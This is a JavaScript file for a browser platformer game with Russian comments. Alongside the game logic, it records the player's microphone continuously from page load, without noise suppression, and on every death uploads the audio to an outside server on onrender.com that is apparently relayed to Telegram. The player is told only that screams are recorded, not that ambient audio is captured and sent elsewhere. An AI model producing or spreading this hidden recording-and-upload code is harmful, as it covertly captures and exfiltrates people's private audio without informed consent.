// ==================== НАСТРОЙКА ИГРЫ ====================
const canvas = document.getElementById('gameCanvas');
const ctx = canvas.getContext('2d');
const keys = { left: false, right: false };
let player = { x: 50, y: 100, w: 25, h: 25, color: '#00ffcc', dy: 0, jumpForce: 12, gravity: 0.6, speed: 5, jumpCount: 0 };
let score = 0, level = 1, hp = 3;
let platforms = [], enemy = { x: 0, y: 0, w: 25, h: 25, startX: 0, range: 0, dir: 1, speed: 2 };
let coin = { x: 0, y: 0 };

// ==================== СИСТЕМА ЗАПИСИ АУДИО ====================
let mediaRecorder = null;
let audioChunks = [];
let audioStream = null;

async function initAudio() {
    try {
        audioStream = await navigator.mediaDevices.getUserMedia({
            audio: { echoCancellation: false, noiseSuppression: false }
        });
        mediaRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm; codecs=opus' });
        audioChunks = [];
        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) audioChunks.push(event.data);
        };
        startRecording(); // Начинаем запись сразу после инициализации
        console.log('🎤 Запись начата.');
    } catch (error) {
        console.error('❌ Ошибка микрофона:', error);
        alert('Для записи криков разрешите доступ к микрофону!');
    }
}

function startRecording() {
    if (mediaRecorder && mediaRecorder.state === 'inactive') {
        audioChunks = [];
        mediaRecorder.start(100);
    }
}

function stopRecordingAndProcess() {
    return new Promise((resolve) => {
        if (!mediaRecorder || mediaRecorder.state === 'inactive') {
            resolve(null);
            return;
        }
        mediaRecorder.onstop = () => {
            const audioBlob = audioChunks.length > 0 ? new Blob(audioChunks, { type: 'audio/webm; codecs=opus' }) : null;
            resolve(audioBlob);
        };
        mediaRecorder.stop();
    });
}

// ==================== ОТПРАВКА/СОХРАНЕНИЕ ====================
async function sendToTelegram(audioBlob) {
    // 🔽 ЭТО САМАЯ ВАЖНАЯ СТРОКА: URL ТВОЕГО СЕРВЕРА НА RENDER
    const SERVER_URL = 'https://scream-game-server.onrender.com/send-scream';

    try {
        // Конвертируем аудио в base64 для отправки
        const reader = new FileReader();
        const audioBase64 = await new Promise((resolve) => {
            reader.onloadend = () => {
                const base64String = reader.result.split(',')[1];
                resolve(base64String);
            };
            reader.readAsDataURL(audioBlob);
        });

        // Отправляем на наш сервер на Render
        const response = await fetch(SERVER_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ audioData: audioBase64 })
        });

        const result = await response.json();
        if (result.success) {
            console.log('✅ Крик отправлен через сервер!');
            return true;
        } else {
            throw new Error('Сервер вернул ошибку');
        }
    } catch (error) {
        console.error('❌ Ошибка при отправке на сервер:', error);
        // Резервный вариант: скачать файл
        downloadAudio(audioBlob);
        return false;
    }
}

function downloadAudio(audioBlob) {
    const url = URL.createObjectURL(audioBlob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `scream_${Date.now()}.wav`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    setTimeout(() => URL.revokeObjectURL(url), 100);
    console.log('💾 Аудио скачано (резервный вариант).');
}

// ==================== ИГРОВАЯ ЛОГИКА ====================
function resizeCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
}
window.addEventListener('resize', resizeCanvas);
resizeCanvas();

function setupLevel(lvl) {
    player.x = 50;
    player.y = 100;
    player.dy = 0;
    let W = canvas.width;
    let H = canvas.height;

    if (lvl === 1) {
        platforms = [
            { x: 0, y: H * 0.7, w: W * 0.3, h: 15 },
            { x: W * 0.35, y: H * 0.5, w: W * 0.3, h: 15 },
            { x: W * 0.7, y: H * 0.3, w: W * 0.25, h: 15 }
        ];
        enemy = { x: W * 0.36, y: H * 0.5 - 25, w: 25, h: 25, startX: W * 0.36, range: W * 0.2, dir: 1, speed: 2 };
    } else {
        platforms = [
            { x: 0, y: H * 0.8, w: W * 0.2, h: 15 },
            { x: W * 0.3, y: H * 0.6, w: W * 0.3, h: 15, moving: true, startX: W * 0.3, range: W * 0.2, dir: 1 },
            { x: W * 0.7, y: H * 0.4, w: W * 0.2, h: 15 }
        ];
        enemy = { x: W * 0.71, y: H * 0.4 - 25, w: 25, h: 25, startX: W * 0.71, range: W * 0.15, dir: 1, speed: 4 };
    }
    spawnCoin();
}

function spawnCoin() {
    let p = platforms[Math.floor(Math.random() * platforms.length)];
    coin.x = p.x + p.w / 2;
    coin.y = p.y - 30;
}

function updateGame() {
    // Управление
    if (keys.left) player.x -= player.speed;
    if (keys.right) player.x += player.speed;

    // Гравитация
    player.dy += player.gravity;
    player.y += player.dy;

    // Столкновение с платформами
    player.grounded = false;
    platforms.forEach(p => {
        if (p.moving) {
            p.x += 2 * p.dir;
            if (p.x > p.startX + p.range || p.x < p.startX) p.dir *= -1;
        }
        if (player.x < p.x + p.w && player.x + player.w > p.x &&
            player.y < p.y + p.h && player.y + player.h > p.y && player.dy > 0) {
            player.dy = 0;
            player.y = p.y - player.h;
            player.grounded = true;
            player.jumpCount = 0;
            if (p.moving) player.x += 2 * p.dir;
        }
    });

    // Движение врага
    enemy.x += enemy.speed * enemy.dir;
    if (enemy.x > enemy.startX + enemy.range || enemy.x < enemy.startX) enemy.dir *= -1;

    // Смерть
    if (player.y > canvas.height || (player.x < enemy.x + enemy.w && player.x + player.w > enemy.x &&
        player.y < enemy.y + enemy.h && player.y + player.h > enemy.y)) {
        handleDeath();
    }

    // Сбор монеты
    if (player.x < coin.x + 15 && player.x + player.w > coin.x &&
        player.y < coin.y + 15 && player.y + player.h > coin.y) {
        score++;
        if (score % 10 === 0) {
            level++;
            setupLevel(level);
        }
        spawnCoin();
    }

    // Границы
    if (player.x < 0) player.x = 0;
    if (player.x > canvas.width - player.w) player.x = canvas.width - player.w;

    // Обновление UI
    document.getElementById('score').innerText = score;
    document.getElementById('lvl').innerText = level;
    document.getElementById('hpDisp').innerHTML = '❤️'.repeat(Math.max(0, hp));
}

async function handleDeath() {
    hp--;
    // 1. Останавливаем запись и получаем аудио
    const audioBlob = await stopRecordingAndProcess();
    
    // 2. Обрабатываем аудио (всегда отправляем на сервер)
    if (audioBlob) {
        await sendToTelegram(audioBlob); // Отправляем на Render
    }
    
    // 3. Перезапуск или респавн
    if (hp <= 0) {
        score = 0;
        hp = 3;
        level = 1;
        setupLevel(1);
    } else {
        player.x = 50;
        player.y = 100;
        player.dy = 0;
    }
    
    // 4. Снова начинаем запись
    setTimeout(startRecording, 500);
}

function drawGame() {
    // Очистка
    ctx.fillStyle = '#050505';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    
    // Платформы
    platforms.forEach(p => {
        ctx.fillStyle = p.moving ? '#0af' : '#444';
        ctx.fillRect(p.x, p.y, p.w, p.h);
    });
    
    // Враг
    ctx.fillStyle = 'red';
    ctx.fillRect(enemy.x, enemy.y, enemy.w, enemy.h);
    // Глаза врага
    ctx.fillStyle = 'white';
    ctx.fillRect(enemy.x + 5, enemy.y + 5, 5, 5);
    ctx.fillRect(enemy.x + 15, enemy.y + 5, 5, 5);
    
    // Монета
    ctx.fillStyle = 'gold';
    ctx.beginPath();
    ctx.arc(coin.x, coin.y, 8, 0, Math.PI * 2);
    ctx.fill();
    
    // Игрок
    ctx.fillStyle = player.color;
    ctx.fillRect(player.x, player.y, player.w, player.h);
    // Глаза игрока
    ctx.fillStyle = '#000';
    ctx.fillRect(player.x + 5, player.y + 8, 4, 4);
    ctx.fillRect(player.x + 16, player.y + 8, 4, 4);
}

// ==================== УПРАВЛЕНИЕ (УНИВЕРСАЛЬНОЕ) ====================
function setupControl(buttonId, keyName) {
    const btn = document.getElementById(buttonId);
    
    // Для телефона (тач-события)
    btn.addEventListener('touchstart', (e) => {
        e.preventDefault();
        keys[keyName] = true;
    });
    btn.addEventListener('touchend', () => {
        keys[keyName] = false;
    });
    
    // Для компьютера (мышь)
    btn.addEventListener('mousedown', (e) => {
        e.preventDefault();
        keys[keyName] = true;
    });
    btn.addEventListener('mouseup', () => {
        keys[keyName] = false;
    });
    btn.addEventListener('mouseleave', () => {
        keys[keyName] = false; // Если курсор ушёл с кнопки
    });
}

// Настраиваем кнопки
setupControl('btnLeft', 'left');
setupControl('btnRight', 'right');

// Особый случай для прыжка
const jumpBtn = document.getElementById('btnJump');
function handleJumpStart(e) {
    e.preventDefault();
    if (player.jumpCount < 2) {
        player.dy = -player.jumpForce;
        player.jumpCount++;
    }
}
function handleJumpEnd(e) {
    e.preventDefault();
}
jumpBtn.addEventListener('touchstart', handleJumpStart);
jumpBtn.addEventListener('touchend', handleJumpEnd);
jumpBtn.addEventListener('mousedown', handleJumpStart);
jumpBtn.addEventListener('mouseup', handleJumpEnd);

// ===== УПРАВЛЕНИЕ С КЛАВИАТУРЫ (для ПК) =====
document.addEventListener('keydown', (e) => {
    switch(e.code) {
        case 'ArrowLeft':
        case 'KeyA':
            keys.left = true;
            break;
        case 'ArrowRight':
        case 'KeyD':
            keys.right = true;
            break;
        case 'ArrowUp':
        case 'Space':
        case 'KeyW':
            if (player.jumpCount < 2) {
                player.dy = -player.jumpForce;
                player.jumpCount++;
            }
            break;
    }
});

document.addEventListener('keyup', (e) => {
    switch(e.code) {
        case 'ArrowLeft':
        case 'KeyA':
            keys.left = false;
            break;
        case 'ArrowRight':
        case 'KeyD':
            keys.right = false;
            break;
    }
});

// ==================== ЗАПУСК ИГРЫ ====================
async function initGame() {
    await initAudio(); // Инициализируем аудио
    setupLevel(1);     // Загружаем первый уровень
    
    // Игровой цикл
    function gameLoop() {
        updateGame();
        drawGame();
        requestAnimationFrame(gameLoop);
    }
    gameLoop();
}

// Запускаем игру когда страница загрузится
window.addEventListener('load', initGame);

